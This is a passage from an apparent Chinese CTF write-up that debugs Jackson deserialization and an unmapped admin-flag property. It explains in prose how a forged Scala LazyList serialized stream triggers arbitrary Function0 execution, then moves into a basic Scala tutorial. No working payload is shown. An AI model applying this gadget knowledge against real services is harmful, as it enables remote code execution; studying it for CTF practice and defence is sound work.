keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">BeanReferring</span> referring <span class=\"token operator\">:</span> referrings<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n              referring<span class=\"token punctuation\">.</span><span class=\"token function\">setBean</span><span class=\"token punctuation\">(</span>bean<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n       <span class=\"token punctuation\">&#125;</span>\n       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>unknown <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token comment\">// polymorphic?</span>\n           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bean<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> _beanType<span class=\"token punctuation\">.</span><span class=\"token function\">getRawClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// lgtm [java/dereferenced-value-may-be-null]</span>\n               <span class=\"token keyword\">return</span> <span class=\"token function\">handlePolymorphic</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">,</span> unknown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token comment\">// no, just some extra unknown properties</span>\n           <span class=\"token keyword\">return</span> <span class=\"token function\">handleUnknownProperties</span><span class=\"token punctuation\">(</span>ctxt<span class=\"token punctuation\">,</span> bean<span class=\"token punctuation\">,</span> unknown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span>\n       <span class=\"token keyword\">return</span> bean<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p><img src=\"/../SCTF/40.png\" alt=\"image.png\">  <br />此时value&#x3D;true<br /><img src=\"/../SCTF/41.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里会根据属性值构造对象</li>\n<li>具体来说，createFromObjectWith() 方法的作用是使用给定的值来创建 Java 对象的实例，并返回创建好的对象。如果创建过程中出现了异常，则会抛出相应的异常。</li>\n</ul>\n<p><img src=\"/../SCTF/42.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里的newInstance，就是在调用下面这个类，对属性进行赋值</li>\n</ul>\n<p><img src=\"/../SCTF/43.png\" alt=\"image.png\"></p>\n<h3 id=\"最最最关键的点\"><a href=\"#最最最关键的点\" class=\"headerlink\" title=\"最最最关键的点\"></a>最最最关键的点</h3><p><img src=\"/../SCTF/44.png\" alt=\"image.png\"></p>\n<ul>\n<li>代码执行到这行的时候，因为<code>isadmin</code>并没有指定映射，所以他认为是<code>&quot;&quot;</code></li>\n</ul>\n<p><img src=\"/../SCTF/45.png\" alt=\"image.png\"><br /><img src=\"/../SCTF/46.png\" alt=\"image.png\"></p>\n<ul>\n<li>所以在执行<code>findCreatorProperty</code>的时候，是有返回值的</li>\n</ul>\n<p><img src=\"/../SCTF/47.png\" alt=\"image.png\"></p>\n<ul>\n<li>因此，<code>creatorProp</code>不是<code>null</code>，会跳过<code>if</code>，从而有了后面的赋值，如果我把<code>json</code>中的<code>&quot;&quot;</code>改为<code>aa</code>，那么<code>creatorProp == null</code>，因此就不会赋值</li>\n</ul>\n<p><img src=\"/../SCTF/48.png\" alt=\"image.png\"></p>\n<h2 id=\"生成payload\"><a href=\"#生成payload\" class=\"headerlink\" title=\"生成payload\"></a>生成payload</h2><p>“yes” 是一个Linux和Unix操作系统上的命令行工具，它会不断地输出指定的字符串或者默认的 “y” 字符串（表示 “yes”），直到被强制终止。这个命令通常用于自动化脚本中，以便在需要用户交互时自动回答 “yes”。</p>\n<p>例如，如果你运行以下命令：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">yes</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>它将会不断输出 “y” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。</p>\n<p>你还可以在 “yes” 命令后面指定一个字符串作为参数，以便输出指定的字符串。例如，如果你想输出 “hello” 字符串，你可以运行以下命令：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">yes</span> hello<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这将会不断输出 “hello” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。</p>\n<p>在 Scala 编程语言中，”Function0” 是一个函数类型，表示一个无参函数。”Object” 是 Scala 中定义所有类的根类型，因此 “Function0<Object>“ 表示一个返回类型为 “Object” 的无参函数类型。<br />具体来说，”Function0” 是一个 Scala 标准库中预定义的函数类型，它是一个 trait（类似于 Java 中的接口），定义了一个名为 “apply” 的方法，该方法接受无参数并返回一个任意类型的值。因此，”Function0” 可以表示任何返回类型为 “Object” 的无参函数类型。<br />在 Scala 中，函数类型可以像任何其他类型一样被作为参数传递给函数、被赋值给变量、被用作函数的返回类型等。因此，”Function0<Object>“ 可以被用作一个函数参数类型或者函数返回类型，表示一个返回类型为 “Object” 的无参函数。例如，下面的代码定义了一个名为 “f” 的函数，它接受一个类型为 “Function0<Object>“ 的参数，并调用该参数表示的函数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">def f(func: Function0[Object]): Unit &#x3D; &#123;\n  val result &#x3D; func()\n  println(result)\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在这个例子中，”f” 函数接受一个类型为 “Function0<Object>“ 的函数作为参数，并调用它来获取一个返回类型为 “Object” 的结果。这个函数类型可以是任何返回类型为 “Object” 的无参函数类型，例如：<br />scala<br />Copy</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">val func1: Function0[String] &#x3D; () &#x3D;&gt; &quot;Hello, world!&quot;\nval func2: Function0[Int] &#x3D; () &#x3D;&gt; 42\nval func3: Function0[Object] &#x3D; () &#x3D;&gt; new java.util.Date()\nf(func1) &#x2F;&#x2F; 打印 &quot;Hello, world!&quot;\nf(func2) &#x2F;&#x2F; 打印 &quot;42&quot;\nf(func3) &#x2F;&#x2F; 打印当前时间<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Technical-details\"><a href=\"#Technical-details\" class=\"headerlink\" title=\"Technical details\"></a>Technical details</h2><ul>\n<li><p>LazyList有一个变量 lazyState,<code> LazyList.State[A]</code> field 类型是Function0</p>\n</li>\n<li><p>序列化使用具有自定义序列化&#x2F;反序列化方法的“代理”对象：</p>\n<ul>\n<li><p>lazylist的已求值元素首先序列化</p>\n</li>\n<li><p>然后使用标准Java对象序列化对lazy list的未求值尾部进行序列化</p>\n</li>\n</ul>\n</li>\n<li><p>反序列化方法调用tail.prependedAll（init）来重构layz list（init是已求值的元素）</p>\n</li>\n<li><p>prependedAll可以调用tail对象的lazyState()函数，在正常情况下不会发生这种情况，但伪造的序列化流可能会迫使控制流进入这种情况</p>\n</li>\n<li><p>lazyState 对象被创建，当反序列化tail 对象时，</p>\n<ul>\n<li>在典型的应用程序类路径中，有很多Function0子类，例如对于一个by-name的参数的每个参数都被编码到Function0中</li>\n<li>对于lazyState field来说，一个伪造的序列化流可以包含Function0实例，</li>\n</ul>\n</li>\n</ul>\n<p>在这种情况下，lazyState函数的调用发生在实际使用反序列化的LazyList之前（例如，分配给局部变量）。因此，即使LazyList对象稍后会导致ClassCastException，自定义lazyState函数也已执行。换句话说，包含伪造的LazyList的序列化流将导致在应用程序的任何反序列化时执行Function0，无论应用程序希望读取什么对象类型。</p>\n<h2 id=\"Scala\"><a href=\"#Scala\" class=\"headerlink\" title=\"Scala\"></a>Scala</h2><p>Scala运行在<strong>Java</strong>虚拟机上，并兼容现有的Java程序。Scala源代码被编译成<strong>Java字节码</strong>，所以它可以运行于<strong>JVM</strong>之上，并可以调用现有的Java类库</p>\n<ul>\n<li><p>Scala可以看成是java的扩展</p>\n</li>\n<li><p>具有更丰富功能的java</p>\n</li>\n</ul>\n<h3 id=\"匹配器match\"><a href=\"#匹配器match\" class=\"headerlink\" title=\"匹配器match\"></a>匹配器match</h3><h4 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h4><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token comment\">// 定义一个值</span>\n<span class=\"token keyword\">val</span> x <span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> \n<span class=\"token comment\">// 使用match对值进行匹配</span>\nx <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// 每个case表示一种匹配情况</span>\n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">1</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">1</span> <span class=\"token comment\">// 如果x满足条件1，就返回结果1</span>\n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">2</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">2</span> <span class=\"token comment\">// 如果x满足条件2，就返回结果2</span>\n  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n  <span class=\"token keyword\">case</span> _ <span class=\"token keyword\">=></span> 默认结果 <span class=\"token comment\">// 如果x都不满足上面的条件，就返回默认结果，_表示任意值</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"其他用法\"><a href=\"#其他用法\" class=\"headerlink\" title=\"其他用法\"></a>其他用法</h4><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token comment\">// 把match赋值给一个变量</span>\n<span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> x <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">1</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">1</span> \n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">2</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">2</span> \n  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 把match作为函数的参数</span>\n<span class=\"token keyword\">def</span> foo <span class=\"token punctuation\">(</span>y<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  println <span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\nfoo <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">1</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">1</span> \n  <span class=\"token keyword\">case</span> 条件<span class=\"token number\">2</span> <span class=\"token keyword\">=></span> 结果<span class=\"token number\">2</span> \n  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// 把match作为函数的返回值</span>\n<span class=\"token keyword\">def</span> bar <span class=\"token punctuation\">(</span>z<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Boolean</span> <span class=\"token operator\">=</span> z <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">case</span> \\\"yes\\\" <span class=\"token keyword\">=></span> <span class=\"token boolean\">true</span> \n  <span class=\"token keyword\">case</span> \\\"no\\\" <span class=\"token keyword\">=></span> <span class=\"token boolean\">false</span> \n  <span class=\"token keyword\">case</span> _ <span class=\"token keyword\">=></span> <span class=\"token boolean\">false</span> \n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"apply方法\"><a href=\"#apply方法\" class=\"headerlink\" title=\"apply方法\"></a>apply方法</h3><p><strong>当我们用括号传递参数给一个类或者对象时，Scala会自动调用它的apply方法，并把参数传给它。</strong></p>\n<h5 id=\"apply方法定义在伴生对象中\"><a href=\"#apply方法定义在伴生对象中\" class=\"headerlink\" title=\"apply方法定义在伴生对象中\"></a>apply方法定义在伴生对象中</h5><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token comment\">// 定义一个类Person，有一个name属性</span>\n<span class=\"token keyword\">class</span> Person<span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// 定义一个伴生对象Person，有一个apply方法，接受一个name参数，返回一个Person实例</span>\n<span class=\"token keyword\">object</span> Person <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> apply<span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Person<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 创建一个Person实例，可以直接用Person(\"Alice\")，而不需要用new Person(\"Alice\")</span>\n<span class=\"token keyword\">val</span> alice <span class=\"token operator\">=</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//相当于Person.apply(\"Alice\")</span>\n\n<span class=\"token comment\">// 打印alice的name属性，输出Alice</span>\nprintln<span class=\"token punctuation\">(</span>alice<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>这里的Person(“Alice”)是在用括号传递参数，就会调用Person的apply方法</li>\n</ul>\n<h5 id=\"apply方法定义在伴生类中\"><a href=\"#apply方法定义在伴生类中\" class=\"headerlink\" title=\"apply方法定义在伴生类中\"></a>apply方法定义在伴生类中</h5><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">def</span> main<span class=\"token punctuation\">(</span>args<span class=\"token operator\">:</span> Array<span class=\"token punctuation\">[</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">class</span> Person<span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token comment\">//在类中定义apply方法，输出name</span>\n      <span class=\"token keyword\">def</span> apply<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span><span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> println<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token id function\">s</span><span class=\"token string\">\"I am </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">name</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">var</span> p<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"lanb0\"</span><span class=\"token punctuation\">)</span>\n    \n    p<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//相当于p.apply()</span>\n    <span class=\"token comment\">//I am lanb0</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><code>Unit</code>是一个特殊的类型，表示不返回任何有用的值。类似于Java中的<code>void</code>类型，<code>Unit</code>在方法或函数不需要返回值时使用</li>\n</ul>\n<h3 id=\"伴生对象\"><a href=\"#伴生对象\" class=\"headerlink\" title=\"伴生对象\"></a>伴生对象</h3><p>伴生对象是Scala中一种特殊的单例对象，它与一个同名的类存在于同一个文件中，这个类被称为伴生类。</p>\n<p>伴生对象和伴生类之间有以下几个特点：</p>\n<ul>\n<li>伴生对象和伴生类可以互相访问对方的私有成员，包括字段和方法。</li>\n<li>伴生对象的成员相当于Java中的静态成员，可以直接通过对象名调用，而不需要创建对象实例。</li>\n<li>伴生对象可以实现apply方法，用于创建伴生类的实例，这样就可以省略new关键字。</li>\n<li>伴生对象可以实现unapply方法，用于实现模式匹配和提取器的功能。</li>\n<li>伴生对象可以扩展一个或多个特质（trait），从而实现多重继承和混入（mixin）的效果。</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token comment\">// 定义一个Person类，作为伴生类</span>\n<span class=\"token keyword\">class</span> Person<span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> age<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> secret <span class=\"token operator\">=</span> <span class=\"token string\">\"I love Scala\"</span>\n\n\n  <span class=\"token keyword\">def</span> sayHello<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    println<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token id function\">s</span><span class=\"token string\">\"Hello, I am </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">name</span></span><span class=\"token string\">, </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">age</span></span><span class=\"token string\"> years old.\"</span></span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 定义一个Person对象，作为伴生对象</span>\n<span class=\"token keyword\">object</span> Person <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">var</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n  <span class=\"token keyword\">def</span> increase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    println<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token id function\">s</span><span class=\"token string\">\"Person count: </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">count</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">def</span> showSec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token builtin\">Unit</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    println<span class=\"token punctuation\">(</span>apply<span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// 定义一个apply方法，用于创建Person类的实例</span>\n  <span class=\"token keyword\">def</span> apply<span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> <span class=\"token builtin\">String</span><span class=\"token punctuation\">,</span> age<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Person <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    increase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">new</span> Person<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 返回新的Person对象</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token comment\">// 定义一个unapply方法，用于提取Person类的属性</span>\n  <span class=\"token keyword\">def</span> unapply<span class=\"token punctuation\">(</span>person<span class=\"token operator\">:</span> Person<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Option<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>person <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> None <span class=\"token comment\">// 如果person为空，返回None</span>\n    <span class=\"token keyword\">else</span> Some<span class=\"token punctuation\">(</span>person<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> person<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 否则返回Some元组</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">def</span> main<span class=\"token punctuation\">(</span>args<span class=\"token operator\">:</span> Array<span class=\"token punctuation\">[</span><span class=\"token builtin\">String</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 使用伴生对象的apply方法创建Person类的实例，省略了new关键字</span>\n    <span class=\"token keyword\">val</span> p1 <span class=\"token operator\">=</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//Person count: 1</span>\n    <span class=\"token keyword\">val</span> p2 <span class=\"token operator\">=</span> Person<span class=\"token punctuation\">(</span><span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//Person count: 2</span>\n\n    <span class=\"token comment\">// 使用伴生对象的字段和方法</span>\n    println<span class=\"token punctuation\">(</span>Person<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出2</span>\n    Person<span class=\"token punctuation\">.</span>increase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// Person count: 3</span>\n    Person<span class=\"token punctuation\">.</span>showSec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//输出Person count: 4</span>\n                    <span class=\"token comment\">//I love Scala(伴生对象可以访问伴生类的私有成员)</span>\n\n    <span class=\"token comment\">// 使用伴生类的字段和方法</span>\n    <span class=\"token comment\">/*\n    println(p1.secret)// 无法访问私有成员\n     */</span>\n    p1<span class=\"token punctuation\">.</span>sayHello<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出Hello, I am Alice, 20 years old.</span>\n\n    <span class=\"token comment\">// 使用模式匹配和提取器，利用伴生对象的unapply方法</span>\n    <span class=\"token keyword\">val</span> p3<span class=\"token operator\">=</span><span class=\"token keyword\">null</span>\n    p1 <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">case</span> Person<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span> <span class=\"token keyword\">=></span> println<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token id function\">s</span><span class=\"token string\">\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">name</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">age</span></span><span class=\"token string\"> years old.\"</span></span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出Alice is 20 years old.</span>\n      <span class=\"token keyword\">case</span> _ <span class=\"token keyword\">=></span> println<span class=\"token punctuation\">(</span><span class=\"token string\">\"Unknown person.\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    p3 <span class=\"token keyword\">match</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">case</span> Person<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span> <span class=\"token keyword\">=></span> println<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token id function\">s</span><span class=\"token string\">\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">name</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">$</span><span class=\"token expression\">age</span></span><span class=\"token string\"> years old.\"</span></span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出Unknown person.</span>\n      <span class=\"token keyword\">case</span> _ <span class=\"token keyword\">=></span> println<span class=\"token punctuation\">(</span><span class=\"token string\">\"Unknown person.\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>前面是在测试apply()方法</li>\n<li>后面用了match，来进行匹配</li>\n</ul>\n<h3 id=\"特质trait\"><a href=\"#特质trait\" class=\"headerlink\" title=\"特质trait\"></a>特质trait</h3><p>Scala语言中，有一个Scala语言中，有一个重要的概念叫做特质(trait)，它<strong>类似于Java语言中的接口</strong>，但是比接口更加强大和灵活。</p>\n<p>特质(trait)是一种定义了一组<strong>抽象或具体</strong>的属性和方法的类型，它可以被类(class)或对象(object)扩展(extends)或混入(mix in)。</p>\n<p>特质可以实现多重继承，也就是说，<strong>一个类可以继承多个特质</strong>，从而获得所有特质中定义的属性和方法。</p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><pre 